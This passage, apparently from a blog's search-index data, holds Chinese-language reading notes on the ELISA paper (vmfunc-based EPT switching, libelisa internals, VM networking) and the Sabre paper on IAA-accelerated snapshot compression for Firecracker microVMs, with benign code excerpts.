list</p>\n<p>sub回到default之前再把sub从EPTP list里面删了</p>\n<p>dlopen加载可信代码 映射到sub EPT</p>\n<p>gate隔离开def和sub 加简单的check就可以</p>\n<h2 id=\"network\"><a href=\"#network\" class=\"headerlink\" title=\"network\"></a>network</h2><p>VM-&gt;虚拟网卡-&gt;qemu&#x2F;kvm-&gt;内核网桥-&gt;物理网卡</p>\n<p>[KVM 介绍（4）：I&#x2F;O 设备直接分配和 SR-IOV <a href=\"https://www.cnblogs.com/sammyliu/p/4548194.html\">KVM PCI&#x2F;PCIe Pass-Through SR-IOV] - SammyLiu - 博客园 (cnblogs.com)</a></p>\n<p>PCI passthrough 设备直通 一个网卡给一个虚拟机用</p>\n<p>SRIOV也是设备直通 但是有一个网卡给多个虚拟机用的能力</p>\n<p>virtual switch是sub context共享的 物理NIC的IO buffer和DMA是sub context共享的</p>\n<p>vNIC的io buffer是def和sub共享的</p>\n<p>virtual switch用了VALE&#x2F;mswitch netmap</p>\n<p>VNIC driver是DPDK写的  user application也要用DPDK去通信</p>\n<p>发包</p>\n<ol>\n<li>vNIC把数据放到IObuffer def和sub shared</li>\n<li>vmfunc</li>\n<li>virtual switch拷贝到目标NIC</li>\n<li>virtual switch trigger sub中的physical NIC driver</li>\n</ol>\n<p>收包</p>\n<ol>\n<li>vNIC</li>\n<li>vmfunc 进入sub</li>\n<li>virtual switch拷贝到vNIC</li>\n</ol>\n<p>PCI passthrough不能被多个VM共用</p>\n<p>转发逻辑完全可编程 和SRIOV不同 后者是硬件代码</p>\n<p>测试用的benchmark都需要基于DPDK的用户进程</p>\n<p><a href=\"https://blog.csdn.net/fengfengdiandia/article/details/52869290\">netmap 介绍-CSDN博客</a></p>\n<p>网络包首发框架 映射网卡packet buffer到用户态</p>\n<p><a href=\"https://conferences.sigcomm.org/sigcomm/2017/files/tutorial-netmap/03-vale.pdf\">03-vale.pdf (sigcomm.org)</a></p>\n<p><a href=\"https://manpages.org/vale/4\">man vale (4): a very fast Virtual Local Ethernet using the netmap API (manpages.org)</a></p>\n<p><a href=\"https://github.com/yasukata/ELISA?tab=readme-ov-file#section-71--vm-networking-system\">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>\n<p><a href=\"https://github.com/yasukata/elisa-app-vmnet/blob/master/client/main.c\">elisa-app-vmnet&#x2F;client&#x2F;main.c at master · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>\n<ol>\n<li><p>guestVM网络请求 被DPDK driver处理<a href=\"https://github.com/yasukata/librte_pmd_rvif/blob/9fbd375484cef415ea61bb6b436d509dca707c87/main.c#L276-L278\">librte_pmd_rvif&#x2F;main.c at 9fbd375484cef415ea61bb6b436d509dca707c87 · yasukata&#x2F;librte_pmd_rvif (github.com)</a></p>\n</li>\n<li><p>先拷贝数据到vNIC iobuf上 这个是def sub共享的</p>\n</li>\n<li><p>然后调用dpdk_rvif_io_hook<a href=\"https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/client/main.c\">elisa-app-vmnet&#x2F;client&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a> 其中do_io会调用elisa_gate_entry</p>\n</li>\n<li><p>触发vmfunc</p>\n</li>\n<li><p>进入sub的entry point 这里entry_function是rvs_fwd</p>\n<p><a href=\"https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/server/lib/libelisa-applib-vmnet/main.c#L68\">elisa-app-vmnet&#x2F;server&#x2F;lib&#x2F;libelisa-applib-vmnet&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>\n<p><a href=\"https://github.com/yasukata/rvs/blob/master/rvs.c\">rvs&#x2F;rvs.c at master · yasukata&#x2F;rvs (github.com)</a></p>\n<p>rvs是单独实现的一个virtual switch</p>\n</li>\n<li><p>virtual switch主要做两件事</p>\n<ul>\n<li>找destination</li>\n<li>拷贝数据到destination NIC的IO buffer</li>\n</ul>\n<p>这部分参考VALE&#x2F;mswitch实现</p>\n</li>\n</ol>\n<h3 id=\"VALE\"><a href=\"#VALE\" class=\"headerlink\" title=\"VALE\"></a>VALE</h3><p>就是一个高性能的virtual switch</p>\n<h3 id=\"hyperNF\"><a href=\"#hyperNF\" class=\"headerlink\" title=\"hyperNF\"></a>hyperNF</h3><ul>\n<li>为了不增加hypervisor的TCB 把基于VALE的vswitch放在一个privilege VM中 实现转发逻辑</li>\n<li>数据和代码export到hypervisor中</li>\n<li>map一些数据结构给VM</li>\n<li>NIC直接连接switch</li>\n</ul>\n<p>transmit</p>\n<ol>\n<li>VM 放数据到packet buffer</li>\n<li>hypercall</li>\n<li>VALE转发逻辑（查询dest地址 拷贝数据）</li>\n<li>hypercall return</li>\n</ol>\n<ul>\n<li>virtio&#x2F;vhost-net是通过hypervisor处理 物理NIC连的是hypervisor上的tap设备</li>\n<li>elisa通过hyperNF的架构 多个VM共享物理NIC的DMA区域 例如加锁使用</li>\n</ul>\n<p>VALE本身就比tap快10-20倍 12年</p>\n<p>hyperNF用了VALE 15年</p>\n<p>发网络包的过程</p>\n<ol>\n<li>guest host通信</li>\n<li>switch转发</li>\n</ol>\n<p>elisa做到的是把通信部分从vm exit变为开销更小的vmfunc 并且用自己实现的高效转发逻辑用sub EPT保护起来 同时实现了隔离性</p>\n<p>baseline：</p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221141207415.png\" alt=\"image-20240221141207415\" style=\"zoom:50%;\" />\n\n\n\n<p>elisa</p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221141230092.png\" alt=\"image-20240221141230092\" style=\"zoom:50%;\" />\n\n\n\n<h2 id=\"libelisa\"><a href=\"#libelisa\" class=\"headerlink\" title=\"libelisa\"></a>libelisa</h2><p>最终执行流也是通过EPT映射决定的 所以如何构造EPT很关键</p>\n<p>managerVM配置好EPT以后写到eptp_list 通过hypercall告诉kvm  kvm通过写vmcs配置eptp_list 然后vmfunc就可以直接用</p>\n<p>elisa-util-exec会直接执行elisa__exec_init managerVM和guestVM都需要执行elisa-util-exec 这样都执行了shared的mmap</p>\n<p>每个需要共享内存的guest VM作为elisa_client</p>\n<ul>\n<li><h4 id=\"elisa-server-运行在managerVM-死循环\"><a href=\"#elisa-server-运行在managerVM-死循环\" class=\"headerlink\" title=\"elisa_server  运行在managerVM 死循环\"></a><a href=\"https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L67\"><code>elisa_server</code></a>  运行在managerVM 死循环</h4><p>由elisa-util-exec调用到elisa_server 传入elisa__server_cb  elisa__server_exit_cb</p>\n<p>fork后执行server_work</p>\n<p>ELISA_APPLIB_FILE&#x3D;.&#x2F;lib&#x2F;libelisa-applib-nop&#x2F;lib.so 这个文件里面只有一个entry_function</p>\n<p>server_cb(elisa__server_cb)调用elisa_create_program_map_req 解析ELF把entry_function的代码段都放到base_gpa后的一页一页</p>\n<p>shared_memory的指针会被放到代码段页之后的一页</p>\n<p>BASE_GPA是1&lt;&lt;37 即128G</p>\n<p>正常来说8G内存范围就是0-8G 超了访问硬件就会报错<br>但是对于虚拟化 有GPA-&gt;HPA翻译 超出的部分也可以被映射到合法的HPA<br>default EPT不映射超出的部分 non-default EPT映射超出的GPA到HPA</p>\n<p>src_gxa表示可能是gva也可能是gpa 实际上都是gva</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">(*map_req)[*map_req_cnt].dst_gpa = <span class=\"number\">0x1000</span> * *map_req_cnt + base_gpa;</span><br><span class=\"line\">(*map_req)[*map_req_cnt].dst_gva = (phdr.p_vaddr &amp; (~((<span class=\"number\">1UL</span> &lt;&lt; <span class=\"number\">12</span>) - <span class=\"number\">1</span>))) + <span class=\"number\">0x1000</span> * j;</span><br><span class=\"line\">(*map_req)[*map_req_cnt].src_gxa = (phdr.p_vaddr &amp; (~((<span class=\"number\">1UL</span> &lt;&lt; <span class=\"number\">12</span>) - <span class=\"number\">1</span>))) + <span class=\"number\">0x1000</span> * j;</span><br></pre></td></tr></table></figure>\n\n<p>server libelisa这边的BASE_GPA是256G</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">__map_req[i].dst_gva = requested_gva + 0x1000 * i;</span><br><span class=\"line\">__map_req[i].dst_gpa = BASE_GPA + 0x1000 * i;</span><br></pre></td></tr></table></figure>\n\n<p><code>embed_addr_to_code((void *)((uintptr_t) __RUNTIME_VALUE_2 + 2), entry_function);</code></p>\n<p>把entry_function的地址写到sub_context的code中</p>\n<p>setup_vcpu_ept_ctx</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">assert(!gva2hpa(req[i].src_gxa, &amp;hpa));</span><br><span class=\"line\">pt_map(&amp;ctx-&gt;pt, req[i].dst_gva, req[i].dst_gpa, req[i].pt_flags, req[i].level);</span><br><span class=\"line\">pt_map(&amp;ctx-&gt;ept, req[i].dst_gpa, hpa, req[i].ept_flags, req[i].level);</span><br></pre></td></tr></table></figure>\n\n<p>原先src_gva-&gt;hpa 是src_gva是已经存在的一块内存区域</p>\n<p>之后dst_gva-&gt;dst_gpa-&gt;hpa 即用新的guest page table和ept 可以用dst_gva访问到这块数据</p>\n<p>pt_map补全页表 建立映射 pgtbl-&gt;cnt表示四级页表中所有页表的个数 pg[0]表示root页表</p>\n<p>把pt页表的映射再加到EPT中</p>\n<p>只是配好了一个pt和一个ept 包括gate sub用到的代码和stack</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memcpy</span>((<span class=\"type\">void</span> *) ctx-&gt;apt_mem, (<span class=\"type\">void</span> *) ctx-&gt;pt.pg[<span class=\"number\">0</span>].va, <span class=\"number\">0x1000</span>);</span><br><span class=\"line\">assert(!gva2hpa((<span class=\"type\">uint64_t</span>) ctx-&gt;apt_mem, &amp;hpa));</span><br><span class=\"line\">pt_map(&amp;ctx-&gt;ept, ((<span class=\"type\">uint64_t</span>) <span class=\"number\">-1</span>) &amp; EPT_ADDR_MASK, hpa, EPT_R | EPT_W | <span class=\"comment\">/*EPT_X | EPT_U |*/</span> EPT_MT, <span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n\n\n<p>ept把0xfffffffff映射到apt_mem的hpa 这样ept四级页表都会有最后一项</p>\n<p>ae是所有页表的最后一个位置</p>\n<p>遍历ept 把512项的每一项都指向ae 即下一级页表的最后一个位置 这样最终会指向apt_mem的hpa 如果已经有指向了 则递归把下一级的指向apt_mem</p>\n<p>改变整个地址空间的映射 不是遍历整个地址空间为每个va创建映射 而是直接修改page table entry即可</p>\n<p>最终配置完的EPT guest自己所有的GPA都会被映射到apt_mem的HPA  存储的数据是guest page table的root page table</p>\n<p>超出范围的GPA被映射到指定的位置  </p>\n<p>gate EPT会被放到eptp_list的最后一个位置</p>\n<p>set_rendezvous_point_eptp_list_hpa 把eptp_list记录到host</p>\n<p>read等待client结束</p>\n<p>配置完成后 多了两个ept  并且ept的合法GPA范围都指向了一起配置好的pt</p>\n</li>\n<li><h4 id=\"elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出\"><a href=\"#elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出\" class=\"headerlink\" title=\"elisa_client 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出\"></a><a href=\"https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L72\"><code>elisa_client</code></a> 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出</h4><p> 由elisa-util-exec调用到elisa_client 传入client_cb </p>\n<p>拿到vcpuid</p>\n<p>client_cb 啥也不干</p>\n<p><code>request_gva = (uint64_t) gate_entry_page + 0x1000;</code></p>\n<p>elisa_guest_activate 写入eptp_list</p>\n<p>elisa__client_work 禁止中断 elisa_gate_entry</p>\n<p>____asm_impl_client 定义了elisa_gate_entry  执行vmfunc(511) 切换到gate ept</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">.src_gxa = (<span class=\"type\">uint64_t</span>) gate_ctx_page,</span><br><span class=\"line\">.dst_gva = requested_gva + <span class=\"number\">0x1000</span> * <span class=\"number\">0</span>,</span><br><span class=\"line\">.dst_gpa = BASE_GPA + <span class=\"number\">0x1000</span> * <span class=\"number\">0</span>,</span><br></pre></td></tr></table></figure>\n\n<p>此使pc正好指向下一个page 这个page通过之前配置好的pt和ept 会被映射到gate_ctx_page</p>\n<p>立即切换之后 并不会马上用到stack 因此可以先写一些不需要stack的汇编 然后配置rsp到事先用mmap准备好的栈位置</p>\n<p>gate执行完(code page上半部分) vmfunc 切换视角 继续执行的是sub page的下半部分 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;.globl __RUNTIME_VALUE_2 \\n\\t&quot;</span><br><span class=\"line\">&quot;__RUNTIME_VALUE_2: \\n\\t&quot;</span><br><span class=\"line\">&quot;movabs $0x123456789abcdef0, %rax \\n\\t&quot; // 0x123456789abcdef0 (pointer to entry point function) is replaced at initialization</span><br><span class=\"line\">&quot;call *%rax \\n\\t&quot;</span><br><span class=\"line\">&quot;movq %rax, %rbx \\n\\t&quot; // save return value on rbx</span><br></pre></td></tr></table></figure>\n\n<p>entry_function中的gva是事先准备好映射的 在shared memory例子中 shm_memory_ptr的gva和src_gva相同 gva不变 通过修改映射访问到host物理内存上的事先用mmap shared准备好的共享内存</p>\n<p>entry_function的映射在<a href=\"https://github.com/yasukata/libelisa-extra/blob/master/include/libelisa_extra/map.h\">libelisa-extra&#x2F;include&#x2F;libelisa_extra&#x2F;map.h at master · yasukata&#x2F;libelisa-extra (github.com)</a>中建立 与shared_memory相同 src_gva&#x3D;dst_gva 不变 dst_gpa一个个往后放</p>\n</li>\n</ul>\n<p>def和sub共享 修改def EPT？ 在启动的时候先让manager VM和guest VM通过qemu提供的共享内存</p>\n<p><a href=\"https://blog.csdn.net/stray2b/article/details/128896078\">qemu-kvm Hypervisor：ivshmem-CSDN博客</a></p>\n<p>managerVM可以知道共享内存的地址  然后建立和guest sub的共享 达到guest def&lt;&#x3D;&gt;manager def&lt;&#x3D;&gt;guest sub共享的效果</p>\n<p>gate_entry_page有三个连续的page</p>\n<p>gate_ctx_page和sub_ctx_page共4个连续的page</p>\n<p>这些page代码通过VM kernel加载以后 放到host真实的物理内存中</p>\n<p>随后通过修改EPT 改变了guest眼中的内存布局(例如物理内存中gate_ctx_page-&gt;eptp_list-&gt;sub_ctx_pape但是GPA视角gate_ctx_page-&gt;eptp_list-&gt;stack)</p>\n<p>guest vm 用户态代码<a href=\"https://github.com/yasukata/elisa-app-nop/blob/master/main.c\">elisa-app-nop&#x2F;main.c at master · yasukata&#x2F;elisa-app-nop (github.com)</a> 其中elisa__client_work调用elisa_gate_entry</p>\n<p><a href=\"https://github.com/yasukata/elisa-util-exec/blob/master/main.c\">elisa-util-exec&#x2F;main.c at master · yasukata&#x2F;elisa-util-exec (github.com)</a></p>\n<p><a href=\"https://github.com/yasukata/libelisa/blob/master/client.c\">libelisa&#x2F;client.c at master · yasukata&#x2F;libelisa (github.com)</a> ____asm_impl_client 定义了elisa_gate_entry 用到vmfunc 执行这行以后去哪了？</p>\n<p><a href=\"https://github.com/yasukata/libelisa/blob/master/server.c#L43\">libelisa&#x2F;server.c at master · yasukata&#x2F;libelisa (github.com)</a>对应了论文中gate entry的header</p>\n<p>vmfunc理论上是某个page的最后一个指令 因此non-default EPT不会再映射开始的vmfunc这个page</p>\n","categories":["papers"]},{"title":"Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs ","url":"/2025/02/04/papers/Sabre/","content":"<h1 id=\"Sabre-Hardware-Accelerated-Snapshot-Compression-for-Serverless-MicroVMs\"><a href=\"#Sabre-Hardware-Accelerated-Snapshot-Compression-for-Serverless-MicroVMs\" class=\"headerlink\" title=\"Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs\"></a>Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs</h1><p>OSDI24</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MTNkYmUwZDlhYjFmN2RkMWZjY2EzMThhMzRmMGM0NDNfN3RIV0RvUkZZb1JvQTJzdk1IekhNam0wOWF2N3NWTGVfVG9rZW46QWpiZ2JBaVhIb0FLQnR4T0h3UGNzN0VRbjJlXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>利用硬件加速器IAA压缩VM snapshot，优化serverless场景下microVM cold start慢的问题</p>\n<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>问题：serverless场景下microVM冷启动 启动时间久</p>\n<ul>\n<li>解决方案：采用VM snapshot 把guest VM memory存到文件里 下次读文件恢复而不是从头启动</li>\n</ul>\n<p>问题：如果存了整个guest memory restore的时候全部load进去太大了</p>\n<ul>\n<li>解决方案: on-demand paging，触发page fault才映射 和传统进程&#x2F;VM 一样 （现有系统如firecracker采用的方式 baseline1）</li>\n</ul>\n<p>问题：page fault导致性能差</p>\n<ul>\n<li>解决方案：prefetch 预测工作集（working set）<ul>\n<li>REAP（record-and-replay）是asplops21加速snapshot的方案，提出用working set记录一次function call的pages prefetch这些page （SOTA方案 baseline2）</li>\n</ul>\n</li>\n</ul>\n<p>snapshot和WS file的大小很影响效率 越小性能越好 </p>\n<ul>\n<li>解决方案：压缩</li>\n</ul>\n<p>问题：解压缩占时间 且在cold start关键路径上</p>\n<h2 id=\"IAA\"><a href=\"#IAA\" class=\"headerlink\" title=\"IAA\"></a>IAA</h2><h3 id=\"IAA介绍\"><a href=\"#IAA介绍\" class=\"headerlink\" title=\"IAA介绍\"></a>IAA介绍</h3><p>Intel In-Memory Analytic Accelerator 集成在CPU SoC上的一个PCIe设备</p>\n<p>用户态应用向IAA工作队列提交请求</p>\n<p>目前主要用在数据库上</p>\n<p>IAA提供C接口 直接用intel提供的库</p>\n<p>相对于就是最简单的压缩的接口 源数据(uint8*)&lt;–&gt;压缩后的数据(uint8*)</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">qpl_path_t</span> execution_path = qpl_path_software;</span><br><span class=\"line\"><span class=\"function\">std::vector&lt;<span class=\"type\">uint8_t</span>&gt; <span class=\"title\">source</span><span class=\"params\">(source_size, <span class=\"number\">5</span>)</span></span>;</span><br><span class=\"line\"><span class=\"function\">std::vector&lt;<span class=\"type\">uint8_t</span>&gt; <span class=\"title\">destination</span><span class=\"params\">(source_size / <span class=\"number\">2</span>, <span class=\"number\">4</span>)</span></span>;</span><br><span class=\"line\"><span class=\"function\">std::vector&lt;<span class=\"type\">uint8_t</span>&gt; <span class=\"title\">reference</span><span class=\"params\">(source_size, <span class=\"number\">7</span>)</span></span>;</span><br><span class=\"line\">std::unique_ptr&lt;<span class=\"type\">uint8_t</span>[]&gt; job_buffer;</span><br><span class=\"line\"><span class=\"type\">uint32_t</span>                   size = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Job initialization</span></span><br><span class=\"line\">qpl_status status = <span class=\"built_in\">qpl_get_job_size</span>(execution_path, &amp;size);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (status != QPL_STS_OK) &#123;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class=\"string\">&quot; acquired during job size getting.\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">job_buffer   = std::<span class=\"built_in\">make_unique</span>&lt;<span class=\"type\">uint8_t</span>[]&gt;(size);</span><br><span class=\"line\">qpl_job* job = <span class=\"built_in\">reinterpret_cast</span>&lt;qpl_job*&gt;(job_buffer.<span class=\"built_in\">get</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">status = <span class=\"built_in\">qpl_init_job</span>(execution_path, job);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (status != QPL_STS_OK) &#123;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class=\"string\">&quot; acquired during job initializing.\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Performing a compression operation</span></span><br><span class=\"line\">job-&gt;op            = qpl_op_compress;</span><br><span class=\"line\">job-&gt;level         = qpl_default_level;</span><br><span class=\"line\">job-&gt;next_in_ptr   = source.<span class=\"built_in\">data</span>();</span><br><span class=\"line\">job-&gt;next_out_ptr  = destination.<span class=\"built_in\">data</span>();</span><br><span class=\"line\">job-&gt;available_in  = source_size;</span><br><span class=\"line\">job-&gt;available_out = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">uint32_t</span>&gt;(destination.<span class=\"built_in\">size</span>());</span><br><span class=\"line\">job-&gt;flags         = QPL_FLAG_FIRST | QPL_FLAG_LAST | QPL_FLAG_DYNAMIC_HUFFMAN | QPL_FLAG_OMIT_VERIFY;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Compression</span></span><br><span class=\"line\">status = <span class=\"built_in\">qpl_execute_job</span>(job);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (status != QPL_STS_OK) &#123;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class=\"string\">&quot; acquired during compression.\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint32_t</span> compressed_size = job-&gt;total_out;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"IAA能力探索\"><a href=\"#IAA能力探索\" class=\"headerlink\" title=\"IAA能力探索\"></a>IAA能力探索</h3><p>对比用IAA硬件压缩与软件压缩的性能：</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YWQwYjU3Mzk1NGM5YjFmMTg5YjkxNTkzZjgxZjUyZDRfYXd0QzNYTWlBdVRUTGVUaEEwVUV6V2wxRkxKTk1BTlNfVG9rZW46SGtnWmJLTVdDb1FrY3p4amwyd2N2eGZYbjViXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjQwYzQyNmIwYTBkNTZmMmI2OWFkZjQzM2FiMmQ3ZTBfZ0xLaHo1UXM3TUtZWlVFYlBlNU1IQzhDVUlpWW1maFFfVG9rZW46U2tyQ2JXWEMwb2Q0cTB4eWZRNWNnVnZybk5jXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>用硬件压缩比软件快（可以支持异步，不占用CPU cycle， 但是这个工作没用到）</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDFkZDNkNTc2NDQzY2EyOWI1MTc1ZTRmMDQ4MmRjZmVfUG95aGpkdEdQMkxjMHRZODNLSTBHN0lMYmhzQVBWMEhfVG9rZW46VnUxQ2JqT3d0bzRmUml4SnpKTWNSOFRhbnZnXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>可扩展性没问题</p>\n<p>后续测试仍用single thread single job完成</p>\n<p>PRS(<em>Page Request Service</em> ) IAA集成了处理page fault的功能</p>\n<p>不需要操作系统先把文件内容读到内存里，可以用mmap 然后硬件通过PRS拿到数据</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NGZmNjI0MGU5MDRhNzA1NmUwMzdmNTA3MGI1MjFhMTlfcnNDMDhWSVRoaERTekp0NHFTQ2F0MTM2cldHY0RaRmVfVG9rZW46THprcmJvZ0Iyb1Eyb014OWhYRGNiTXJsbktmXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<ul>\n<li>Decompress比Disk Read要快，不会拖慢整体时间</li>\n<li>O_DIRECT是为了绕过page cache提高性能（REAP使用的优化方式之一）</li>\n<li>Disk Read与Disk Read+Decompress重合 -&gt; decompress和disk read overlap 是streaming的操作</li>\n</ul>\n<p>这里对IAA的测试和分析理论上提出了应用于microVM snapshot性能提升的可行性</p>\n<h2 id=\"sabre-design\"><a href=\"#sabre-design\" class=\"headerlink\" title=\"sabre design\"></a>sabre design</h2><p>扩展压缩&#x2F;解压一段数据的功能至：</p>\n<ol>\n<li>压缩&#x2F;解压多块内存区域</li>\n<li>压缩的数据存到文件，恢复时读取再解压</li>\n</ol>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ2MDEwY2M5ZGVmY2Q1NjY0MDUwM2NjN2E2ZjMwODRfSEV1aHI4cTExazVlM2w3S1RRM2FzMjN1Q1Y0cnpBVG1fVG9rZW46SUptYmI1emtNb1lhSER4dTBsdGNIS1RqbkZkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>snapshot保存memory之外还会保存memory partition压缩前后的位置信息</p>\n<p>snapshot和prefetch各提出了两种方案</p>\n<h3 id=\"snapshot\"><a href=\"#snapshot\" class=\"headerlink\" title=\"snapshot\"></a>snapshot</h3><ol>\n<li>每块不连续的内存先复制到一块连续的buffer上，然后压缩一次</li>\n<li>每块不连续的内存独立压缩，压缩后的数据连续存到磁盘里</li>\n</ol>\n<h3 id=\"prefetch\"><a href=\"#prefetch\" class=\"headerlink\" title=\"prefetch\"></a>prefetch</h3><ol>\n<li>解压一次，根据记录的信息恢复到不同的内存区域（通过userfaultfd，多一次memory copy 但是因为DMA连续 所以性能好）</li>\n<li>根据记录的信息解压多次</li>\n</ol>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><h3 id=\"microbenchmark\"><a href=\"#microbenchmark\" class=\"headerlink\" title=\"microbenchmark\"></a>microbenchmark</h3><p>先和不压缩比，然后和软件压缩比</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MWI1YjQxMjVkOGQ4ODI3MmQwNmM5Y2RkMjJjNDIyNzlfVFhKa0pESmFZVzgwbzVaR0ZWVkE4R0U2YlU0SnZ2ejFfVG9rZW46UFdGR2I3ZDRlb2pIT0Z4OEhhemNva0NablVnXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>passthrough表示读不压缩的snapshot(174.5MB)</p>\n<p>sparsity表示连续page大小 1表示每个page都被一个empty page隔开</p>\n<p>压缩率是2.2x 所以考虑到磁盘读，最大的加速比就是2.2 sabre是1.9</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=N2M1YmViNTQ0NGJmMzIyMjk0OGNkZDA0ZDE5MGFkM2NfdERBQXpqa2RMdmJlcWhVaWtKTDEzZDlQOTREeFo5N3lfVG9rZW46SU1aOGJYOEw5b20xTUl4WkFaN2NQSzBOblFkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>比较软件方案</p>\n<ul>\n<li>create：IAA最快</li>\n<li>restore-single：IAA最快</li>\n<li>restore-scattered: 稀疏性越弱IAA越快</li>\n</ul>\n<h3 id=\"end-to-end\"><a href=\"#end-to-end\" class=\"headerlink\" title=\"end-to-end\"></a>end-to-end</h3><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg5ZjM1NzY2NzhlNDc1YTNjM2RkYTZkNjllMDZkNzZfQ3IxVzlGMndEaW9HenRDaDlFeUdpUHNTMTBPakNSQUJfVG9rZW46SXZSWGJqMWJkb0dCaDF4bHE2TGNQWjhzbjFiXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>已经集成到firecracker中</p>\n<p>使用KVM提供的dirty pages Diff Snapshot</p>\n<p>数据大，粒度粗，选择用scattered（没有对比）</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzQ2OWFkY2JkYjEyOTI3OTE0Y2E1Mjc4YjQzNTU1MjdfcERyOE1qTzdUcUNQbWJDb2N3VUtzRzIzMVd6OHJDb01fVG9rZW46Tkd0Z2JKTVlObzdNcEd4eFdsMmN1cVlRbjFmXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>baseline是snapshot 不压缩 不prefetch</p>\n<ul>\n<li>baseline使用on-demand paging VM load的时候耗时少 但是函数调用会触发一系列page fault</li>\n<li>Sabre在VM load时需要恢复guest memory 耗时多 但是prefetch了内存 函数调用快</li>\n</ul>\n<p>最高64% cold start加速</p>\n<p>和SOTA方案REAP比</p>\n<p>REAP的working set记录的page比较分散 选择用single-chunk（没有对比）</p>\n<p><img 